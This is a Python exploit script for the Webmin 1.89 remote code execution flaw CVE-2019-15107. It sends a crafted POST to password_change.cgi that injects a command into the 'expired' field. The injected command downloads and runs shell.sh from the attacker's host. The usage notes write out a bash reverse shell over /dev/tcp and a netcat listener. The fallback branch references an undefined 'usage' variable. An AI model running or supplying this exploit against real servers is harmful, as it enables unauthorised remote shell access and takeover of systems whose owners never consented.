#!/usr/bin/env python3

"""
CVE-2019-15107 Webmin 1.89 Remote Code Execution
usage: 
- change the attack IP

echo "bash -c 'exec bash -i &>/dev/tcp/attackIP/53<&1'" >> shell.sh
python3 -m http.server
nc -nlvp 53
python3 exploit.py <victimIP>
"""

import os, sys, requests

lhost = "attackIP"
lport = "53"

def exploit(target, port, url, command):
    header = f"Referer: https://{target}:{port}/session_login.cgi"
    payload = 'user=gotroot&pam=&expired=2|echo "";{}'.format(command) #syntax obtained from packet storm
    os.system("curl -k {} -d '{}' -H '{}'".format(url,payload,header))

if __name__ == '__main__':
    try:
        target = sys.argv[1]
        port = 10000
        url = f"https://{target}:{port}/password_change.cgi"
        command = f"wget http://{lhost}/shell.sh -O /tmp/shell.sh ; cd /tmp ; chmod 700 shell.sh ; ./shell.sh"
        exploit(target, port, url, command)
    except:
        print(usage)
